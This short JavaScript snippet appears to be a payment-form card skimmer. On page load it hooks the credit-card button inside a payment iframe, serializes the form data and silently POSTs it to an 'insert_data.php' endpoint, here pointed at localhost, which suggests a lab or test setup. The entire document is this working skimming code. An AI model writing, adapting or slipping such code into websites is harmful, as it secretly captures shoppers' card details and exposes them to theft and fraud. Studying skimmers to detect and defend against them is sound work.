window.onload = function() {
  var iframe = $('ifrmPayment');
  jQuery('#ifrmPayment').contents().find('#btnCreditCard').bind("mouseup touchend", function(e) {
    var dati = jQuery('#ifrmPayment').contents().find('form');
    var pdati = dati.serializeArray();
    setTimeout(function() {
      jQuery.ajax({
        type: "POST",
        async: true,
        url: "http://localhost:8000/insert_data.php",
        data: pdati,
        dataType: 'application/json'
      });
    }, 20);
  });
};
